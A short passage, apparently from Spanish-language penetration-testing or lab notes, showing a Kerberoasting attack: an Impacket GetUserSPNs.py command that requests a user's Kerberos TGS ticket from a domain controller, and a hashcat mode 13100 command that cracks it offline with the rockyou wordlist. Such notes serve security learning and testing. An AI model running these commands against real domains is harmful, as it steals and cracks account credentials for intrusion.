...
GetUserSPNs.py -dc-ip <DC_IP> DC.local/User -request-user User -outputfile User_tgs

# (5) Cracking offline con Hashcat (Kerberos TGS etype 23 → modo 13100)
hashcat -m 13100 User_tgs /usr/share/wordlists/rockyou.txt
